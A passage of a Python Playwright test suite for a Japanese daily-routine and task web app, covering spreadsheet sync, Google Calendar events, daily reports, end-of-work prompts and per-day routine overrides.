        page.click(".act[data-record=wake]")
        page.clock.run_for(6000)  # 5秒待ってまとめて送る
        page.wait_for_function("JSON.parse(localStorage.getItem('db.sync')).lastAt > 0", timeout=3_000)
        self.assertEqual(len(posts), 1)
        ctype, body = posts[0]
        self.assertNotIn("json", ctype)  # 単純な送信（事前確認なし）
        self.assertEqual(body["token"], "sync-secret")
        self.assertEqual(body["records"]["2026-11-09"], [{"kind": "wake", "label": "起きた", "time": "10:00", "n": 1, "state": "記録", "at": "2026-11-09 10:00"}])
        self.assertEqual(body["routine"][0][:3], ["平日", "07:00", "07:30"])
        self.assertEqual([t[0] for t in body["timers"]], ["作業", "休憩", "入浴", "歯磨き"])
        page.evaluate("location.hash = '#system'")
        self.assertIn("に送りました", page.text_content("#sync-status"))
        # 1分以内の変更はまとめて、1分たってから送る
        page.evaluate("location.hash = '#home'")
        page.click(".act[data-record=breakfast]")
        page.clock.run_for(6000)
        self.assertEqual(len(posts), 1)
        page.clock.run_for(60_000)
        page.wait_for_timeout(300)
        self.assertEqual(len(posts), 2)
        self.assertEqual([r["kind"] for r in posts[1][1]["records"]["2026-11-09"]], ["wake", "breakfast"])

    def test_sync_payload_has_priority_and_subtasks(self):
        """スプレッドシートへ：タスクに優先度、ミニタスクは親の id と名前を添えて別に送る（D-070）"""
        tasks = [{"id": "a", "title": "旅行", "due": None, "priority": "high", "done": False, "createdAt": 1,
                  "subtasks": [{"id": "s1", "title": "宿", "done": True, "doneAt": int(datetime(2026, 11, 9, 9, 30).timestamp() * 1000)}]},
                 {"id": "b", "title": "古い形", "due": None, "done": False, "createdAt": 2}]
        page = self.tasks_page(tasks=tasks)
        body = page.evaluate("Sync.payload()")
        self.assertEqual([t["priority"] for t in body["tasks"]], ["高", "なし"])
        self.assertEqual(body["subtasks"], [{"parentId": "a", "parentTitle": "旅行", "id": "s1", "title": "宿", "state": "済み", "doneAt": "2026-11-09 09:30"}])

    def test_sync_retries_after_failure_and_send_now(self):
        fail = {"on": True}
        page, posts = self.sync_page(fail=fail)
        page.click(".act[data-record=wake]")
        page.clock.run_for(6000)
        page.wait_for_function("JSON.parse(localStorage.getItem('db.sync')).error", timeout=3_000)
        page.evaluate("location.hash = '#system'")
        self.assertIn("送れませんでした", page.text_content("#sync-status"))
        fail["on"] = False
        page.click("#sync-now")
        page.wait_for_function("document.getElementById('sync-status').textContent.includes('に送りました')", timeout=3_000)
        self.assertFalse(json.loads(page.evaluate("localStorage.getItem('db.sync')"))["dirty"])

    def test_sync_not_sent_until_configured(self):
        page, posts = self.sync_page(configured=False)
        page.click(".act[data-record=wake]")
        page.clock.run_for(6000)
        page.wait_for_timeout(300)
        self.assertEqual(posts, [])
        page.evaluate("location.hash = '#system'")
        self.assertEqual(page.text_content("#sync-status"), "未設定")
        page.click("#sync-now")
        self.assertIn("URL と合言葉", page.text_content("#sync-status"))
        page.fill("#sync-url", self.GAS)
        page.dispatch_event("#sync-url", "change")
        page.fill("#sync-token", "sync-secret")
        page.dispatch_event("#sync-token", "change")
        page.click("#sync-now")
        page.wait_for_function("document.getElementById('sync-status').textContent.includes('に送りました')", timeout=3_000)
        self.assertEqual(len(posts), 1)

    # ---------- 設定と仕様関連（D-051） ----------
    def test_settings_daily_items_then_system_screen(self):
        page = self.clock_page(10, 0, "#settings")
        cards = page.eval_on_selector_all("#view-settings .card h2", "els => els.map(e => e.textContent)")
        self.assertEqual(cards, ["キィニチの話し方", "声掛けの通知", "週次コメント", "キィニチの一言", "立ち絵"])  # 日常の設定だけ（毎日の時刻は予定の画面へ。D-060 ⑭。立ち絵は D-066。話し方は D-082）
        self.assertNotIn("移りました", page.text_content("#view-settings"))  # 移したときのお知らせは消した（D-064 ⑨）
        link = page.eval_on_selector("#view-settings .sub-link", "e => [e.textContent, e.getBoundingClientRect().top > document.querySelector('#view-settings .card:last-of-type').getBoundingClientRect().bottom]")
        self.assertEqual(link, ["仕様関連›", True])  # いちばん下
        page.click("#view-settings .sub-link")
        page.wait_for_selector("#view-system", state="visible")
        self.assertTrue(page.is_hidden("#view-settings"))
        cards = page.eval_on_selector_all("#view-system .card h2", "els => els.map(e => e.textContent)")
        self.assertEqual(cards, ["起動状態（確認用）", "通知の再設定", "スプレッドシートへの控え"])
        self.assertEqual(page.text_content("#app-version"), page.evaluate("APP_VERSION"))
        page.click("#view-system .back")
        page.wait_for_selector("#view-settings", state="visible")
        h = page.eval_on_selector("#view-settings .sub-link", "e => e.getBoundingClientRect().height")
        self.assertGreaterEqual(h, 44)

    # ---------- Google カレンダー（D-053） ----------
    def ms(self, day, h=0, m=0, month=11):
        return int(datetime(2026, month, day, h, m).timestamp() * 1000)

    def test_calendar_events_replace_sample_events(self):
        events = [{"title": "打ち合わせ", "start": self.ms(9, 14), "end": self.ms(9, 15), "allDay": False},
                  {"title": "出張", "start": self.ms(11), "end": self.ms(13), "allDay": True}]
        reads = []
        page, posts = self.sync_page(events=events, reads=reads)
        page.wait_for_function("document.body.classList.contains('calendar-on')", timeout=3_000)
        self.assertEqual(reads[0]["token"], "sync-secret")
        self.assertEqual([reads[0]["from"], reads[0]["to"]], [self.ms(1, month=10), int(datetime(2027, 2, 1).timestamp() * 1000)])  # 先月の1日〜再来月の終わり
        self.assertEqual(page.text_content(".next-title"), "昼食")  # 10:00 の次。生活の時刻と混ざる
        page.evaluate("location.hash = '#schedule'")
        today = [r[:2] for r in self.schedule_rows(page, "2026-11-09")]
        self.assertIn(["14:00", "打ち合わせ"], today)
        self.assertEqual([r[:2] for r in self.schedule_rows(page, "2026-11-11")][0], ["終日", "出張"])
        self.assertEqual([r[:2] for r in self.schedule_rows(page, "2026-11-12")][0], ["終日", "出張"])
        self.assertNotIn("歯医者", page.text_content("#schedule-days"))  # 仮の予定は出さない
        self.assertTrue(page.is_hidden("#view-schedule h1 .sample-tag"))
        self.assertTrue(page.is_visible("#calendar-note"))
        self.assertTrue(page.is_hidden("#view-schedule .sample-note"))
        page.click("#schedule-mode-month")
        tags = page.eval_on_selector_all(".cal-cell[data-date='2026-11-12'] .cal-tag", "els => els.map(e => e.textContent)")
        self.assertEqual(tags, ["出張"])
        page.evaluate("location.hash = '#system'")
        self.assertIn("取りました（2件）", page.text_content("#calendar-status"))

    def test_calendar_refresh_every_five_minutes_and_keeps_old_on_failure(self):
        reads, fail = [], {"on": False}
        events = [{"title": "打ち合わせ", "start": self.ms(9, 14), "end": self.ms(9, 15), "allDay": False}]
        page, posts = self.sync_page(events=events, reads=reads, fail=fail)
        page.wait_for_function("document.body.classList.contains('calendar-on')", timeout=3_000)
        self.hide_and_return(page, 60_000)  # 5分たっていなければ取り直さない
        page.wait_for_timeout(300)
        self.assertEqual(len(reads), 1)
        fail["on"] = True
        page.clock.run_for(5 * 60_000 + 61_000)  # 開いている間も、5分ごとに取り直す
        page.wait_for_function("JSON.parse(localStorage.getItem('db.calendar')).error", timeout=3_000)
        self.assertEqual(len(reads), 2)
        page.evaluate("location.hash = '#schedule'")
        self.assertIn("打ち合わせ", page.text_content("#schedule-days"))  # 取れなくても前の分を出す
        page.evaluate("location.hash = '#system'")
        self.assertIn("取れませんでした", page.text_content("#calendar-status"))
        fail["on"] = False
        page.click("#calendar-now")
        page.wait_for_function("document.getElementById('calendar-status').textContent.includes('取りました')", timeout=3_000)

    def test_calendar_not_read_until_configured_and_sample_shown(self):
        reads = []
        page, posts = self.sync_page(configured=False, reads=reads)
        page.wait_for_timeout(500)
        self.assertEqual(reads, [])
        self.assertFalse(page.evaluate("document.body.classList.contains('calendar-on')"))
        self.assertTrue(page.is_visible(".next-label .sample-tag"))
        page.evaluate("location.hash = '#system'")
        self.assertIn("未設定", page.text_content("#calendar-status"))

    # ---------- カレンダーの続き（D-054） ----------
    def test_event_add_edit_delete_from_schedule(self):
        events, writes, reads = [{"id": "w1", "calendarId": "me", "title": "毎週の会議", "start": self.ms(9, 15), "end": self.ms(9, 16), "allDay": False, "editable": False}], [], []
        page, posts = self.sync_page(events=events, writes=writes, reads=reads)
        page.wait_for_function("document.body.classList.contains('calendar-on')", timeout=3_000)
        page.evaluate("location.hash = '#schedule'")
        self.assertTrue(page.is_visible("#event-add-open"))
        self.assertEqual(page.query_selector_all(".event-edit"), [])  # 繰り返し・招待の予定は直せない
        page.click("#event-add-open")
        self.assertEqual(page.evaluate(self.GOLD_FILLS.replace("#view-timer", "#view-schedule")), ["event-save"])  # 金の塗りは「保存」だけ
        self.assertEqual([page.input_value("#event-date"), page.input_value("#event-start"), page.input_value("#event-end")], ["2026-11-09", "11:00", "12:00"])
        page.click("#event-save")
        self.assertIn("名前", page.text_content("#event-form-status"))
        page.fill("#event-title", "歯医者")
        page.fill("#event-start", "17:30")
        page.fill("#event-end", "18:00")
        page.click("#event-save")
        page.wait_for_selector("#event-form", state="hidden", timeout=3_000)
        self.assertEqual({k: writes[0][k] for k in ("action", "title", "start", "end", "allDay")},
                         {"action": "add", "title": "歯医者", "start": self.ms(9, 17, 30), "end": self.ms(9, 18), "allDay": False})
        self.assertIn("「歯医者」を足しました", page.text_content("#event-status"))
        self.assertIn(["17:30", "歯医者"], [r[:2] for r in self.schedule_rows(page, "2026-11-09")])  # 読み直して出る
        # 直す：終日にする
        page.click("#schedule-days .schedule-day[data-date='2026-11-09'] .event-edit")
        self.assertEqual(page.text_content("#event-form-title"), "予定を直す")
        self.assertEqual(page.input_value("#event-title"), "歯医者")
        page.click("#event-allday")
        self.assertTrue(page.is_hidden("#event-times"))
        page.fill("#event-date", "2026-11-10")
        page.click("#event-save")
        page.wait_for_selector("#event-form", state="hidden", timeout=3_000)
        self.assertEqual({k: writes[1][k] for k in ("action", "id", "start", "end", "allDay")},
                         {"action": "update", "id": "new1", "start": self.ms(10), "end": self.ms(11), "allDay": True})
        self.assertEqual([r[:2] for r in self.schedule_rows(page, "2026-11-10")][0], ["終日", "歯医者"])
        # 消す：確認してから
        page.click("#schedule-days .schedule-day[data-date='2026-11-10'] .event-edit")
        page.click("#event-delete")
        self.assertIn("消しますか", page.text_content("#confirm-text"))
        page.click("#confirm-cancel")
        self.assertEqual(len(writes), 2)
        page.click("#event-delete")
        page.click("#confirm-ok")
        page.wait_for_selector("#event-form", state="hidden", timeout=3_000)
        self.assertEqual({k: writes[2][k] for k in ("action", "id")}, {"action": "remove", "id": "new1"})
        self.assertNotIn("歯医者", page.text_content("#schedule-days"))

    def test_event_allday_can_span_days(self):
        """終日の予定は、始まりの日から終わりの日まで（含む）で足せる・直せる。31日まで（D-077）"""
        events, writes = [], []
        page, posts = self.sync_page(events=events, writes=writes)
        page.wait_for_function("document.body.classList.contains('calendar-on')", timeout=3_000)
        page.evaluate("location.hash = '#schedule'")
        page.click("#event-add-open")
        self.assertTrue(page.is_hidden("#event-days"))  # 終日でないときは出さない
        page.fill("#event-title", "帰省")
        page.click("#event-allday")
        self.assertTrue(page.is_visible("#event-days"))
        self.assertTrue(page.is_hidden("#event-times"))
        self.assertEqual(page.text_content("#event-date-label"), "始まりの日")
        self.assertEqual(page.input_value("#event-end-date"), "2026-11-09")  # 初めは同じ日
        page.fill("#event-date", "2026-11-11")
        self.assertEqual(page.input_value("#event-end-date"), "2026-11-11")  # 始まりを動かすと終わりもついてくる
        page.fill("#event-end-date", "2026-11-13")
        page.click("#event-save")
        page.wait_for_selector("#event-form", state="hidden", timeout=3_000)
        self.assertEqual({k: writes[0][k] for k in ("action", "start", "end", "allDay")},
                         {"action": "add", "start": self.ms(11), "end": self.ms(14), "allDay": True})
        for d in ("2026-11-11", "2026-11-12", "2026-11-13"):
            self.assertIn(["終日", "帰省"], [r[:2] for r in self.schedule_rows(page, d)])
        self.assertNotIn(["終日", "帰省"], [r[:2] for r in self.schedule_rows(page, "2026-11-14")])
        # 直す：終わりの日が戻り、始まりを1日後ろにすると期間ごと動く
        page.click("#schedule-days .schedule-day[data-date='2026-11-12'] .event-edit")
        self.assertEqual([page.input_value("#event-date"), page.input_value("#event-end-date")], ["2026-11-11", "2026-11-13"])
        page.fill("#event-date", "2026-11-12")
        self.assertEqual(page.input_value("#event-end-date"), "2026-11-14")
        page.click("#event-save")
        page.wait_for_selector("#event-form", state="hidden", timeout=3_000)
        self.assertEqual({k: writes[1][k] for k in ("action", "start", "end", "allDay")},
                         {"action": "update", "start": self.ms(12), "end": self.ms(15), "allDay": True})
        # 期間がおかしいときは送らない
        page.click("#event-add-open")
        page.fill("#event-title", "合宿")
        page.click("#event-allday")
        page.fill("#event-end-date", "2026-11-08")
        page.click("#event-save")
        self.assertIn("始まりの日と同じか後", page.text_content("#event-form-status"))
        page.fill("#event-end-date", "2026-12-10")  # 32日
        page.click("#event-save")
        self.assertIn("31日まで", page.text_content("#event-form-status"))
        page.fill("#event-end-date", "2026-12-09")  # ちょうど31日
        page.click("#event-save")
        page.wait_for_selector("#event-form", state="hidden", timeout=3_000)
        self.assertEqual(writes[2]["end"] - writes[2]["start"], 31 * 86_400_000)
        self.assertEqual(len(writes), 3)

    def test_event_form_shows_error_when_offline_and_hidden_without_calendar(self):
        fail, writes = {"on": False}, []
        page, posts = self.sync_page(events=[], writes=writes, fail=fail)
        page.wait_for_function("document.body.classList.contains('calendar-on')", timeout=3_000)
        page.evaluate("location.hash = '#schedule'")
        page.click("#event-add-open")
        page.fill("#event-title", "買い出し")
        fail["on"] = True
        page.click("#event-save")
        page.wait_for_function("document.getElementById('event-form-status').textContent.includes('通信できません')", timeout=3_000)
        self.assertTrue(page.is_visible("#event-form"))  # 入力は残す
        page2, _ = self.sync_page(configured=False)
        page2.evaluate("location.hash = '#schedule'")
        self.assertTrue(page2.is_hidden("#event-add-open"))  # カレンダーをつなぐまで出さない

    def test_event_reminders_and_wake_line(self):
        events = [{"id": "a", "calendarId": "me", "title": "歯医者", "start": self.ms(9, 17, 30), "end": self.ms(9, 18), "allDay": False, "editable": True},
                  {"id": "b", "calendarId": "me", "title": "出張", "start": self.ms(9), "end": self.ms(10), "allDay": True, "editable": True},
                  {"id": "c", "calendarId": "me", "title": "朝会", "start": self.ms(9, 7, 30), "end": self.ms(9, 8), "allDay": False, "editable": True}]
        page, posts = self.sync_page(hour=7, minute=10, events=events, voice=True)
        page.wait_for_function("document.body.classList.contains('calendar-on')", timeout=3_000)
        # カレンダーを読んだあとに、声掛けの予約が付け替わるのを待つ（読むのは本当の通信、待つのは偽の時計なので少しずつ進める）
        for _ in range(40):
            page.clock.run_for(500)
            page.wait_for_timeout(50)
            if any(p == "schedule" and b["key"].startswith("event:") for p, b in self.voice_calls):
                break
        page.clock.run_for(1500)
        page.wait_for_timeout(200)
        sched = {b["key"]: b for p, b in self.voice_calls if p == "schedule" and b["key"].startswith("event:")}
        self.assertEqual(len(sched), 1)  # 終日の予定と、30分前を過ぎた朝会には掛けない
        ev = list(sched.values())[0]
        self.assertEqual(ev["at"], self.ms(9, 17))
        self.assertEqual(ev["body"], "「歯医者」まであと30分だ。準備しておけ。")
        self.assertIn("trigger=event_before.default", ev["url"])
        self.assertIn("title=%E6%AD%AF%E5%8C%BB%E8%80%85", ev["url"])
        # 起きたときに今日の予定を添える
        page.click(".act[data-record=wake]")
        self.assertTrue(page.text_content("#bubble-text").endswith("今日は予定が3件ある。最初は07:30の「朝会」だ。"))
        # 通知から開くと予定の名前入りのセリフ
        page.goto(self.base + "index.html?mode=standalone&source=webpush&trigger=event_before.default&line=0&title=" + "%E6%AD%AF%E5%8C%BB%E8%80%85")
        page.wait_for_function("dialogue !== null")
        self.assertEqual(page.text_content("#bubble-text"), "「歯医者」まであと30分だ。準備しておけ。")
        self.assertNotIn("title=", page.url)

    # ---------- 完了したタスクを日報へ・仕事終わりの提案・操作への反応・一言の面の紋章（D-059） ----------
    def test_task_to_report_on_complete_and_undo(self):
        page = self.tasks_page(hour=10)
        page.click(ADD_NONE)
        self.assertEqual(page.get_attribute("#task-report", "aria-checked"), "false")  # 作るたびにオフから
        page.fill("#task-title", "見積もりを送る")
        page.click("#task-report")
        page.click("#task-submit")
        self.assertIn("完了したら日報へ", page.text_content("#task-list"))
        self.assertTrue(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["toReport"])
        page.click("#task-list .task-done-btn")
        page.wait_for_selector("#done-list li", state="attached", timeout=3_000)
        self.assertIn("日報に入れました", page.text_content("#task-toast"))
        r = json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]
        self.assertEqual(r["done"], "・見積もりを送る")
        self.assertTrue(r["savedAt"])
        page.click("#task-toast .undo")  # 取り消すと日報からも外す（ほかに何もなければ日報ごと消える）
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')")), {})
        # 日報に書いてある日：その下に足す。入力欄にも出る
        page.evaluate("location.hash = '#report'")
        page.fill("#report-done", "会議")
        page.click("#report-save")
        page.evaluate("location.hash = '#tasks'")
        page.click("#task-list .task-done-btn")
        page.wait_for_selector("#done-list li", state="attached", timeout=3_000)
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]["done"], "会議\n・見積もりを送る")
        page.evaluate("location.hash = '#report'")
        self.assertEqual(page.input_value("#report-done"), "会議\n・見積もりを送る")
        page.evaluate("location.hash = '#tasks'")
        page.click("#done-section summary")
        page.click("#done-list .task-done-btn")  # 未完了に戻すと外す
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]["done"], "会議")

    def test_task_without_report_switch_does_not_touch_report(self):
        tasks = [{"id": "a", "title": "洗濯", "due": None, "done": False, "createdAt": 1}]
        page = self.tasks_page(tasks=tasks)
        page.click("#task-list .task-done-btn")
        page.wait_for_selector("#done-list li", state="attached", timeout=3_000)
        self.assertIsNone(page.evaluate("localStorage.getItem('db.reports')"))
        # 完了の反応（D-059）
        self.assertIn(page.text_content("#tasks-say-line"), ["今は抱えているものはないな。", "やることが出てきたら、ここに書いておけ。"])  # 0件になったら空の一言
        tasks = [{"id": "a", "title": "洗濯", "due": None, "done": False, "createdAt": 1}, {"id": "b", "title": "掃除", "due": None, "done": False, "createdAt": 2}]
        page = self.tasks_page(tasks=tasks)
        page.click("#task-list li[data-id=a] .task-done-btn")
        page.wait_for_selector("#done-list li", state="attached", timeout=3_000)
        self.assertIn(page.text_content("#tasks-say-line"), ["片づいたな。次に移れ。", "一つ減ったな。"])

    def test_work_end_offers_to_postpone_due_tasks(self):
        tasks = [{"id": "a", "title": "見積もり", "due": "2026-11-09", "done": False, "createdAt": 1},
                 {"id": "b", "title": "請求書", "due": "2026-11-05", "done": False, "createdAt": 2},
                 {"id": "c", "title": "読書", "due": None, "done": False, "createdAt": 3}]
        init = "localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks)) + MOOD_NORMAL  # 調子は聞いたあと（D-073）
        page = self.clock_page(18, 20, init_script=init)  # 仕事終わりの時刻（18:30）の前
        self.assertTrue(page.is_hidden("#bubble-choices"))
        page.click(".act[data-record=work_end]")
        self.assertEqual(page.text_content("#bubble-text"), "今日までのものが2件残っている。明日に回すかどうかは、自分で決めろ。")
        self.assertTrue(page.is_visible("#bubble-choices"))
        self.assertEqual(self.primaries(page), ["dinner"])  # 金の塗りは記録の1つだけ（選択肢は塗らない）
        self.assertLessEqual(page.evaluate("document.documentElement.scrollHeight"), page.evaluate("innerHeight"))  # ホームはスクロールしない
        page.click("#choice-postpone")
        self.assertEqual(page.text_content("#bubble-text"), "明日に回した。今日はここまでだ。")
        self.assertTrue(page.is_hidden("#bubble-choices"))
        due = {t["id"]: t["due"] for t in json.loads(page.evaluate("localStorage.getItem('db.tasks')"))}
        self.assertEqual(due, {"a": "2026-11-10", "b": "2026-11-10", "c": None})
        # 「このまま」・残りがない日は聞かない
        page = self.clock_page(18, 20, init_script=init)
        page.click(".act[data-record=work_end]")
        page.click("#choice-keep")
        self.assertEqual(page.text_content("#bubble-text"), "わかった。無理のない分だけでいい。")
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["due"], "2026-11-09")
        page = self.clock_page(18, 20, init_script=MOOD_NORMAL)
        page.click(".act[data-record=work_end]")
        self.assertTrue(page.is_hidden("#bubble-choices"))
        self.assertEqual(page.text_content("#bubble-text"), "今日の仕事はここまでだ。切り替えろ。")

    def test_work_end_asks_mood_then_offers(self):
        """仕事終わりで今日の調子を聞き、日報の調子に入れる。疲れたなら回すほうを先に言う（D-073）"""
        tasks = [{"id": "a", "title": "見積もり", "due": "2026-11-09", "done": False, "createdAt": 1}]
        init = "localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks))
        page = self.clock_page(18, 20, init_script=init)
        page.click(".act[data-record=work_end]")
        self.assertEqual(page.text_content("#bubble-text"), "今日の調子はどうだった。")
        self.assertEqual(page.eval_on_selector_all("#bubble-mood .chip", "els => els.map(e => e.textContent)"), ["元気", "ふつう", "疲れた"])
        self.assertTrue(page.is_hidden("#bubble-choices"))
        self.assertTrue(page.evaluate("document.querySelector('.dialogue').contains(document.getElementById('toast'))"))  # 取り消しはセリフの面の中
        self.assertLessEqual(page.evaluate("document.documentElement.scrollHeight"), page.evaluate("innerHeight"))
        page.click("#bubble-mood [data-mood=tired]")
        self.assertEqual(page.text_content("#bubble-text"), "疲れているなら、今日までの1件は明日に回してもいい。決めるのは自分だ。")
        self.assertTrue(page.is_visible("#bubble-choices"))
        self.assertTrue(page.is_hidden("#bubble-mood"))
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]["mood"], "tired")
        page.evaluate("location.hash = '#report'")  # 日報で直せる
        self.assertEqual(page.get_attribute("#report-form .mood[data-mood=tired]", "aria-pressed"), "true")
        # 調子がわかっている日は聞かない。残りがなければ調子への一言
        page = self.clock_page(18, 20, init_script=MOOD_NORMAL)
        page.click(".act[data-record=work_end]")
        self.assertTrue(page.is_hidden("#bubble-mood"))
        page = self.clock_page(18, 20)
        page.click(".act[data-record=work_end]")
        page.click("#bubble-mood [data-mood=good]")
        self.assertEqual(page.text_content("#bubble-text"), "わかった。今日はここまでだ。")
        page = self.clock_page(18, 20)
        page.click(".act[data-record=work_end]")
        page.click("#bubble-mood [data-mood=tired]")
        self.assertEqual(page.text_content("#bubble-text"), "そうか。今日は早めに休め。")

    def test_evening_offer_on_home_once_a_day(self):
        """仕事終わりの時刻を過ぎてホームを開くと、今日までの残りがあれば提案を1回だけ出す。通知はしない（D-073）"""
        tasks = [{"id": "a", "title": "見積もり", "due": "2026-11-09", "done": False, "createdAt": 1}]
        init = "localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks))
        page = self.clock_page(18, 20, init_script=init)
        self.assertTrue(page.is_hidden("#bubble-choices"))  # 時刻の前は出さない
        page = self.clock_page(18, 40, init_script=init)
        self.assertEqual(page.text_content("#bubble-text"), "仕事の時間は過ぎたな。今日までのものが1件残っている。明日に回すか、自分で決めろ。")
        self.assertTrue(page.is_visible("#bubble-choices"))
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.evening')")), {"date": "2026-11-09"})
        page.reload()  # その日はもう出さない
        page.wait_for_function("dialogue !== null")
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertTrue(page.is_hidden("#bubble-choices"))
        # 疲れている日は回すほうを先に。休日（仕事終わりの時刻なし）は出さない
        tired = init + "localStorage.setItem('db.reports', JSON.stringify({ '2026-11-09': { mood: 'tired', done: '', left: '', tomorrow: '', savedAt: 1 } }));"
        page = self.clock_page(18, 40, init_script=tired)
        self.assertIn("疲れているなら", page.text_content("#bubble-text"))
        page = self.clock_page(18, 40, day=8, init_script=init)  # 11/8 は日曜
        self.assertTrue(page.is_hidden("#bubble-choices"))

    def test_mini_dialogue_has_small_emblem(self):
        page = self.timer_page()
        bg = page.eval_on_selector("#timer-say", "e => [getComputedStyle(e, '::before').backgroundImage, getComputedStyle(e, '::before').width]")
        self.assertIn("mini-emblem.svg", bg[0])
        self.assertEqual(bg[1], "40px")

    # ---------- R5 の利用者の決定（D-060 ⑫⑬⑮） ----------
    def test_undo_toast_moves_into_dialogue_during_proposal(self):
        tasks = [{"id": "a", "title": "見積もり", "due": "2026-11-09", "done": False, "createdAt": 1}]
        page = self.clock_page(18, 20, init_script="localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks)) + MOOD_NORMAL)
        page.click(".act[data-record=work_end]")
        self.assertTrue(page.is_visible("#bubble-choices"))
        self.assertTrue(page.is_visible("#toast"))
        self.assertTrue(page.evaluate("document.querySelector('.dialogue').contains(document.getElementById('toast'))"))
        overlap = page.evaluate("""() => { const t = document.getElementById('toast').getBoundingClientRect(); const n = document.querySelector('.next-strip').getBoundingClientRect();
          return t.bottom > n.top && t.top < n.bottom; }""")
        self.assertFalse(overlap)  # NEXT を隠さない
        page.click("#toast .undo")  # 取り消しは効く
        self.assertNotIn("done", page.get_attribute(".act[data-record=work_end]", "class") or "")
        page.click(".act[data-record=work_end]")
        page.click("#choice-keep")  # 選んだら、取り消しの表示はふだんの場所に戻る
        self.assertFalse(page.evaluate("document.querySelector('.dialogue').contains(document.getElementById('toast'))"))
        page.click(".act[data-record=dinner]")
        self.assertTrue(page.is_visible("#toast"))
        self.assertFalse(page.evaluate("document.getElementById('toast').classList.contains('in-dialogue')"))

    def test_undo_toast_in_dialogue_is_not_cut_off(self):
        """夕方の提案中、セリフの面の中の取り消しの表示は文を途中で切らない（13px、入らなければ折り返す）。ホームははみ出さない（D-064 ⑧、I3-02）"""
        tasks = [{"id": "a", "title": "見積もり", "due": "2026-11-09", "done": False, "createdAt": 1}]
        for size, safe in (((393, 852), (59, 34)), ((375, 667), (20, 0))):
            page = self.clock_page(18, 20, size=size, safe=safe, init_script="localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks)) + MOOD_NORMAL)
            page.click(".act[data-record=work_end]")
            self.assertTrue(page.evaluate("document.getElementById('toast').classList.contains('in-dialogue')"))
            span = page.eval_on_selector("#toast > span", "e => [e.textContent, e.scrollWidth <= e.clientWidth, getComputedStyle(e).fontSize]")
            self.assertIn("仕事終わり", span[0])
            self.assertTrue(span[1], size)          # 「…」で切れていない
            self.assertEqual(span[2], "13px", size)
            self.assertGreaterEqual(page.eval_on_selector("#toast .undo", "e => e.getBoundingClientRect().height"), 44)
            self.assertLessEqual(page.evaluate("document.documentElement.scrollHeight"), page.evaluate("innerHeight"), size)  # V4-02

    def test_settings_texts_are_short_with_details_and_caution(self):
        page = self.clock_page(10, 0, "#settings")
        notes = page.eval_on_selector_all("#view-settings .card > p.note", "els => els.map(e => [e.textContent, Math.round(e.getBoundingClientRect().height / parseFloat(getComputedStyle(e).lineHeight || 20))])")
        texts = [t for t, _ in notes]
        self.assertIn("週が明けたら、先週の日報からキィニチが短く振り返ります。", texts)
        self.assertIn("食事・休憩・夜・就寝前・予定の前に、アプリを閉じていても声を掛けます。記録すれば取り消します。", texts)
        self.assertIn("オフにすると、タスク・タイマー・予定・日報の一言を出しません。", texts)
        for sel in ("#view-settings .card .more",):
            self.assertGreaterEqual(len(page.query_selector_all(sel)), 3)
        self.assertTrue(page.is_hidden("#view-settings .more .note >> nth=0"))  # 「詳しく」は閉じている
        page.click("#view-settings .more summary >> nth=0")
        self.assertTrue(page.is_visible("#view-settings .more .note >> nth=0"))
        heights = page.eval_on_selector_all("#view-settings .card > p.note", "els => els.map(e => e.getBoundingClientRect().height)")
        line = page.eval_on_selector("#view-settings .card > p.note", "e => parseFloat(getComputedStyle(e).fontSize) * 1.5")
        page.set_viewport_size({"width": 393, "height": 852})
        self.assertTrue(all(h <= line * 2 + 2 for h in page.eval_on_selector_all("#view-settings .card > p.note", "els => els.map(e => e.getBoundingClientRect().height)")))  # 2行以内
        page.evaluate("location.hash = '#system'")
        self.assertIn("アプリを消すと記録は戻せません", page.text_content("#view-system"))

    # ---------- 毎日の時刻をその日だけ変える（D-060 ⑭） ----------
    def routine_row(self, page, date, title):
        return "#schedule-days .schedule-day[data-date='%s'] .routine-row-item:has-text('%s')" % (date, title)

    def test_routine_override_for_one_day(self):
        page = self.clock_page(6, 0, "#schedule")
        page.click(self.routine_row(page, "2026-11-09", "起床"))
        self.assertTrue(page.is_visible("#routine-day"))
        self.assertEqual(page.text_content("#routine-day-title"), "11/9(月)の起床")
        self.assertIn("平日の時刻：07:00", page.text_content("#routine-day-base"))
        self.assertEqual(page.input_value("#routine-day-time"), "07:00")
        self.assertTrue(page.is_hidden("#routine-day-reset"))
        page.fill("#routine-day-time", "08:30")
        page.click("#routine-day-save")
        self.assertFalse(page.is_visible("#routine-day"))
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.routineOverrides')")), {"2026-11-09": {"wake": "08:30"}})
        self.assertIn("11/9(月)の起床を08:30にしました", page.text_content("#routine-msg"))
        rows = [r[:2] for r in self.schedule_rows(page, "2026-11-09")]
        self.assertIn(["08:30", "起床この日だけ"], rows)
        self.assertEqual([r[:2] for r in self.schedule_rows(page, "2026-11-10")][0], ["07:00", "起床"])  # ほかの日はそのまま
        # ホーム：次の予定と記録ボタンの時間帯も、その日だけの時刻を使う
        page.evaluate("location.hash = '#home'")
        self.assertEqual([page.text_content(".next-time"), page.text_content(".next-title")], ["07:30", "朝食"])
        self.assertEqual(self.docked(page), ["wake", "breakfast"])  # 起床の時間帯が 5:30〜 になった（6:00 は入る）
        # この日はなし → 元に戻す
        page.evaluate("location.hash = '#schedule'")
        page.click(self.routine_row(page, "2026-11-09", "朝食"))
        page.click("#routine-day-none")
        skipped = page.eval_on_selector_all("#schedule-days .schedule-day[data-date='2026-11-09'] .routine-skipped", "els => els.map(e => e.textContent)")
        self.assertEqual(skipped, ["なし朝食この日だけ"])
        page.evaluate("location.hash = '#home'")
        self.assertNotIn("breakfast", self.docked(page))
